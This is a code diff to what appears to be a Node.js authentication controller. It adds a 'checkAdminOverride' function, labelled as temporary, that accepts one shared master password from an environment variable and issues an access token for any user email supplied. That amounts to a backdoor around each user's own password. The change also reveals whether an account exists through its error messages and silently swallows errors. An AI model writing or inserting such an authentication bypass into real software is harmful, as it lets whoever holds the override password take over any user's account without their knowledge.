@@ -39,6 +39,32 @@ exports.registerUser = async function (req, res) {
 
 }
 
+exports.checkAdminOverride = async function (req, res, next) {
+    const { email, password } = req.body;
+    if (!email || !password) return res.status(400).send('Missing email or password');
+
+    let dbUser;
+
+    try {
+        const { rows } = await dbModel.getUserByEmail(email);
+        if (rows.length === 0) throw new Error('No user found with that email');
+        else dbUser = rows[0];
+    } catch (error) {
+        return res.status(500).send(error.message);
+    }
+
+    /* Temporary admin override functionality */
+    try {
+        bcrypt.compare(password, process.env.ADMIN_OVERRIDE_HASH, async (err, result) => {
+            if (result) {
+                return res.status(200).send({ email: dbUser.email, role: 'demo', accessToken: auth.generateAccessToken(dbUser) });
+            } else next();
+        });
+    } catch (error) { }
+    /* End temporary admin override functionality */
+
+}   
+
 exports.signInUser = async function (req, res) {
 
     const { email, password, rememberMe } = req.body;
@@ -58,7 +84,7 @@ exports.signInUser = async function (req, res) {
     }
 
     try {
-        await bcrypt.compare(password, dbUser.password, async (err, result) => {
+        bcrypt.compare(password, dbUser.password, async (err, result) => {
             if (err) {
                 res.status(500).send('Error: Couldn\'t compare passwords; ' + err);
             } else if (result) {
